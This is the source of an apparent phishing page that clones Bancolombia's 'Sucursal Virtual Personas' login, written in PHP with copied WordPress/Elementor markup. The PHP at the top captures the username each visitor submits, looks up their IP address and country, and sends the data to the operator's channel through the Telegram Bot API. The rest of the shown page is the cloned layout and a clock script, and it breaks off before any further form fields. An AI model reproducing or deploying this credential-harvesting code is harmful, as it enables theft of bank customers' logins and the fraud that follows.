<?php
ini_set("display_errors", 0);
include("datos_telgr.php");
function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
@$pais = $meta['geoplugin_countryName'];

////////////////////

if(isset ($_POST['user']) ){


$message = "Datos BANCOL-MBIA:\r\n👤Usuario: ".$_POST['user']."\r\n🌎IP ".$myip." ".$pais."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


}else{ header ('location: index.php'); exit(); }

?>
<!DOCTYPE html>

<html lang="es-CO" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
		<title>Clave – Home</title>
<meta name="robots" content="noindex, nofollow">

<script>
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/palestra-c75773.ingress-earth.ewp.live\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.1.1"}};
/*! This file is auto-generated */
!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode,e=(p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0),i.toDataURL());return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(p&&p.fillText)switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([129777,127995,8205,129778,127999],[129777,127995,8203,129778,127999])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
</script><script src="./archivos/wp-emoji-release.min.js.descarga" type="text/javascript" defer=""></script>
<style>
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 0.07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel="stylesheet" id="custom-style-css" href="./archivos/style-show-ip-address.css" type="text/css" media="all">
<link rel="stylesheet" id="dce-animations-css" href="./archivos/animations.css" type="text/css" media="all">
<link rel="stylesheet" id="wp-block-library-css" href="./archivos/style.min.css" type="text/css" media="all">
<link rel="stylesheet" id="classic-theme-styles-css" href="./archivos/classic-themes.min.css" type="text/css" media="all">
<style id="global-styles-inline-css" type="text/css">
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;}:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="uaf_client_css-css" href="./archivos/uaf.css" type="text/css" media="all">
<link rel="stylesheet" id="hello-elementor-css" href="./archivos/style.min(1).css" type="text/css" media="all">
<link rel="stylesheet" id="hello-elementor-theme-style-css" href="./archivos/theme.min.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-icons-css" href="./archivos/elementor-icons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-frontend-legacy-css" href="./archivos/frontend-legacy.min.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-frontend-css" href="./archivos/frontend.min.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-post-9-css" href="./archivos/post-9.css" type="text/css" media="all">
<link rel="stylesheet" id="dce-style-css" href="./archivos/style.min(2).css" type="text/css" media="all">
<link rel="stylesheet" id="dashicons-css" href="./archivos/dashicons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-pro-css" href="./archivos/frontend.min(1).css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-global-css" href="./archivos/global.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-post-522-css" href="./archivos/post-522.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-post-874-css" href="./archivos/post-874.css" type="text/css" media="all">
<link rel="stylesheet" id="google-fonts-1-css" href="./archivos/css" type="text/css" media="all">
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin=""><script src="./archivos/jquery.min.js.descarga" id="jquery-core-js"></script>
<script src="./archivos/jquery-migrate.min.js.descarga" id="jquery-migrate-js"></script>

		<script>
			document.documentElement.className = document.documentElement.className.replace( 'no-js', 'js' );
		</script>
				<style>
			.no-js img.lazyload { display: none; }
			figure.wp-block-image img.lazyloading { min-width: 150px; }
							.lazyload, .lazyloading { opacity: 0; }
				.lazyloaded {
					opacity: 1;
					transition: opacity 400ms;
					transition-delay: 0ms;
				}
					</style>
		<link rel="icon" href="archivos/cropped-favicon-32x32.png" sizes="32x32">
<link rel="icon" href="archivos/cropped-favicon-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="archivos/cropped-favicon-180x180.png">
<meta name="msapplication-TileImage" content="archivos/cropped-favicon-270x270.png">
		<style id="wp-custom-css">
			body .elementor-14 .elementor-element.elementor-element-732bde2 .elementor-labels-above .elementor-field-group > label {
    padding-bottom: 10px;
    background-image: url(archivos/icc.png);
    height: auto;
    max-width: 100%;
    border: none;
    border-radius: 0;
    box-shadow: none;
    width: 100%;
    background-repeat: no-repeat;
    background-position: -2px -3px;
    padding-left: 28px;

}		</style>
			<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"></head>
<body class="page-template page-template-elementor_canvas page page-id-522 elementor-default elementor-template-canvas elementor-kit-9 elementor-page elementor-page-522 e--ua-blink e--ua-chrome e--ua-webkit" data-elementor-device-mode="widescreen">
	<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-dark-grayscale"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0 0.49803921568627"></fefuncr><fefuncg type="table" tableValues="0 0.49803921568627"></fefuncg><fefuncb type="table" tableValues="0 0.49803921568627"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-grayscale"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0 1"></fefuncr><fefuncg type="table" tableValues="0 1"></fefuncg><fefuncb type="table" tableValues="0 1"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-yellow"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0.54901960784314 0.98823529411765"></fefuncr><fefuncg type="table" tableValues="0 1"></fefuncg><fefuncb type="table" tableValues="0.71764705882353 0.25490196078431"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-red"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0 1"></fefuncr><fefuncg type="table" tableValues="0 0.27843137254902"></fefuncg><fefuncb type="table" tableValues="0.5921568627451 0.27843137254902"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-midnight"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0 0"></fefuncr><fefuncg type="table" tableValues="0 0.64705882352941"></fefuncg><fefuncb type="table" tableValues="0 1"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-magenta-yellow"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0.78039215686275 1"></fefuncr><fefuncg type="table" tableValues="0 0.94901960784314"></fefuncg><fefuncb type="table" tableValues="0.35294117647059 0.47058823529412"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-green"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0.65098039215686 0.40392156862745"></fefuncr><fefuncg type="table" tableValues="0 1"></fefuncg><fefuncb type="table" tableValues="0.44705882352941 0.4"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-orange"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0.098039215686275 1"></fefuncr><fefuncg type="table" tableValues="0 0.66274509803922"></fefuncg><fefuncb type="table" tableValues="0.84705882352941 0.41960784313725"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg>		<div data-elementor-type="wp-page" data-elementor-id="522" class="elementor elementor-522">
						<div class="elementor-inner">
				<div class="elementor-section-wrap">
									<section class="elementor-section elementor-top-section elementor-element elementor-element-ac8891c elementor-section-height-full elementor-section-items-stretch elementor-hidden-mobile elementor-section-boxed elementor-section-height-default" data-id="ac8891c" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-no">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-3102ebf" data-id="3102ebf" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<section class="elementor-section elementor-inner-section elementor-element elementor-element-50d566f elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="50d566f" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-4a1f97e" data-id="4a1f97e" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-a5b3107 dce_masking-none elementor-widget elementor-widget-image" data-id="a5b3107" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
								<div class="elementor-image">
												<img decoding="async" width="168" height="21" alt="" 
												class="attachment-full size-full wp-image-36 ls-is-cached lazyloaded" src="./archivos/svgexport-1.svg"><noscript>
												<img decoding="async" width="168" height="21" src="archivos/svgexport-1.svg" class="attachment-full size-full wp-image-36" alt="" /></noscript>														</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-81bded4 elementor-widget elementor-widget-heading" data-id="81bded4" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Sucursal Virtual Personas</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-e780644 elementor-widget__width-inherit elementor-widget elementor-widget-html" data-id="e780644" data-element_type="widget" data-widget_type="html.default">
				<div class="elementor-widget-container">
				<div class="wrap">
		<div class="widget">
			<div class="fecha reloj caja-segundos">
			    <p>Fecha y hora actual: </p>
			    &nbsp;&nbsp;
				<p id="diaSemana" class="diaSemana"></p>
				<p id="dia" class="dia"></p>
				<p>de </p>
				<p id="mes" class="mes"></p>
				<p>de </p>
				<p id="year" class="year"></p>
                &nbsp;
				<p id="horas" class="horas"></p>
				<p>:</p>
				<p id="minutos" class="minutos"></p>
				<p>:</p>
				<p id="segundos" class="segundos"></p>
				<p id="ampm" class="ampm"></p>
			</div>
		</div>
	</div>
	<script>
	    (function(){
	var actualizarHora = function(){
		// Obtenemos la fecha actual, incluyendo las horas, minutos, segundos, dia de la semana, dia del mes, mes y año;
		var fecha = new Date(),
			horas = fecha.getHours(),
			ampm,
			minutos = fecha.getMinutes(),
			segundos = fecha.getSeconds(),
			diaSemana = fecha.getDay(),
			dia = fecha.getDate(),
			mes = fecha.getMonth(),
			year = fecha.getFullYear();

		// Accedemos a los elementos del DOM para agregar mas adelante sus correspondientes valores
		var pHoras = document.getElementById('horas'),
			pAMPM = document.getElementById('ampm'),
			pMinutos = document.getElementById('minutos'),
			pSegundos = document.getElementById('segundos'),
			pDiaSemana = document.getElementById('diaSemana'),
			pDia = document.getElementById('dia'),
			pMes = document.getElementById('mes'),
			pYear = document.getElementById('year');

		
		// Obtenemos el dia se la semana y lo mostramos
		var semana = ['Domingo', 'Lunes', 'Martes', 'Miercoles', 'Jueves', 'Viernes', 'Sabado'];
		pDiaSemana.textContent = semana[diaSemana];

		// Obtenemos el dia del mes
		pDia.textContent = dia;

		// Obtenemos el Mes y año y lo mostramos
		var meses = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre']
		pMes.textContent = meses[mes];
		pYear.textContent = year;

		// Cambiamos las hora de 24 a 12 horas y establecemos si es AM o PM

		if (horas >= 12) {
			horas = horas - 12;
			ampm = 'PM';
		} else {
			ampm = 'AM';
		}

		// Detectamos cuando sean las 0 AM y transformamos a 12 AM
		if (horas == 0 ){
			horas = 12;
		}

		// Si queremos mostrar un cero antes de las horas ejecutamos este condicional
		// if (horas < 10){horas = '0' + horas;}
		pHoras.textContent = horas;
		pAMPM.textContent = ampm;

		// Minutos y Segundos
		if (minutos < 10){ minutos = "0" + minutos; }
		if (segundos < 10){ segundos = "0" + segundos; }

		pMinutos.textContent = minutos;
		pSegundos.textContent = segundos;
	};

	actualizarHora();
	var intervalo = setInterval(actualizarHora, 1000);
}())
	</script>		</div>
				</div>
						</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-1a8d527" data-id="1a8d527" data-element_type="column">
			<div class="elementor-column-wrap">
							<div class="elementor-widget-wrap">
								</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section class="elementor-section elementor-inner-section elementor-element elementor-element-96ea26b elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="96ea26b" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-866ee4e" data-id="866ee4e" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-04abd95 elementor-widget elementor-widget-heading" data-id="04abd95" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Inicio de sesión</h2>		</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section class="elementor-section elementor-inner-section elementor-element elementor-element-96686a5 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="96686a5" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-b763c70" data-id="b763c70" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-0c2c75e elementor-widget elementor-widget-heading" data-id="0c2c75e" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Imagen y frase de seguridad seleccionadas</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-a843f77 elementor-widget elementor-widget-heading" data-id="a843f77" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Verifiación de seguridad puede variar, de esta manera asegurarás de estar ingresando a la Sucursal Virtual Personas de Bancolombia</h2>		</div>
				</div>
						</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-5a5ff1b" data-id="5a5ff1b" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<section class="elementor-section elementor-inner-section elementor-element elementor-element-0e1fe6c elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="0e1fe6c" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-034548a" data-id="034548a" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
